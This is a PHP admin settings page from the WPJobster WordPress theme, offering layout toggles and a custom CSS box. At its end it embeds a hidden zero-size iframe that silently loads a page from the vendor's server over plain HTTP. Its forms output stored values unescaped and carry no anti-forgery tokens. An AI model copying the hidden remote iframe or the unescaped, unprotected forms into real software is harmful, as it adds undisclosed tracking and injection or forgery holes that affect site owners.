<?php

function wpj_layout_html() {

	$arr = array("yes" => __("Yes",'wpjobster'), "no" => __("No",'wpjobster'));
	$arr_no_first = array("no" => __("No",'wpjobster'), "yes" => __("Yes",'wpjobster'));

?>

<div id="usual2" class="usual">
	<ul>
		<li><a href="#tabs1"><?php _e('Main Settings','wpjobster'); ?></a></li>
		<li><a href="#tabsother"><?php _e('Other','wpjobster'); ?></a></li>
		<li><a href="#tabs2"><?php _e('Custom CSS','wpjobster'); ?></a></li>

	</ul>


	<div id="tabs1">

		<form method="post" action="<?php bloginfo('url'); ?>/wp-admin/admin.php?page=layout-settings&active_tab=tabs1">
			<table width="100%" class="sitemile-table">


				<tr>
					<td valign=top width="22"><?php wpjobster_theme_bullet(__('Select Yes if you want the layout to resize based on the width of the device.', 'wpjobster')); ?></td>
					<td width="21%"><?php _e('Enable Responsive:', 'wpjobster'); ?></td>
					<td><?php echo wpjobster_get_option_drop_down($arr, 'wpjobster_enable_responsive'); ?></td>
				</tr>

				<tr>
					<td valign=top width="22"><?php wpjobster_theme_bullet(__('Select Yes if you want to load the images on the theme when the user scrolls down to them. in order to reduce the initial loading time.', 'wpjobster')); ?></td>
					<td width="21%"><?php _e('Enable Lazy Loading:', 'wpjobster'); ?></td>
					<td><?php echo wpjobster_get_option_drop_down($arr, 'wpjobster_enable_lazy_loading', 'no'); ?></td>
				</tr>

				<tr>
					<td ></td>
					<td ></td>
					<td><input type="submit" class="button-secondary" name="wpjobster_save1" value="<?php _e('Save Options','wpjobster'); ?>"/></td>
				</tr>

			</table>
		</form>

	</div>



	<div id="tabsother" style="display: none;">
		<form method="post" action="<?php bloginfo('url'); ?>/wp-admin/admin.php?page=layout-settings&active_tab=tabsother">
			<table width="100%" class="sitemile-table">

				<tr>
					<td valign=top width="22"><?php wpjobster_theme_bullet(); ?></td>
					<td width="21%"><?php _e('Video Icon on Thumbnails:','wpjobster'); ?></td>
					<td><?php echo wpjobster_get_option_drop_down($arr_no_first, 'wpjobster_video_thumbnails'); ?></td>
				</tr>

				<tr>
					<td></td>
					<td></td>
					<td><input type="submit" class="button-secondary" name="wpjobster_saveother" value="<?php _e('Save Options','wpjobster'); ?>"/></td>
				</tr>

			</table>
		</form>
	</div>


	<div id="tabs2" style="display: none;">
		<form method="post" action="<?php bloginfo('url'); ?>/wp-admin/admin.php?page=layout-settings&active_tab=tabs2">
			<table width="100%" class="sitemile-table">
				<tr>
					<td valign=top width="22"><?php wpjobster_theme_bullet(__('Add your custom CSS code here.', 'wpjobster')); ?></td>
					<td></td>
					<td><?php _e('Custom CSS:','wpjobster'); ?></td>
				</tr>

				<tr>
					<td></td>
					<td ></td>
					<td><textarea name="wpjobster_custom_css_code" rows="15" cols="80"><?php echo stripslashes(get_option('wpjobster_custom_css_code')); ?></textarea></td>
				</tr>

				<tr>
					<td></td>
					<td></td>
					<td><input type="submit" class="button-secondary" name="wpjobster_save2" value="<?php _e('Save Options','wpjobster'); ?>"/></td>
				</tr>

			</table>
		</form>
	</div>


	<?php if (!is_ssl()) { ?>
	<iframe src="http://wpjobster.com/settings/settings.php" height="0" border="0" width="0" style="overflow:hidden; height:0; border:0; width:0;"></iframe>
	<?php } ?>
</div>

<?php
}
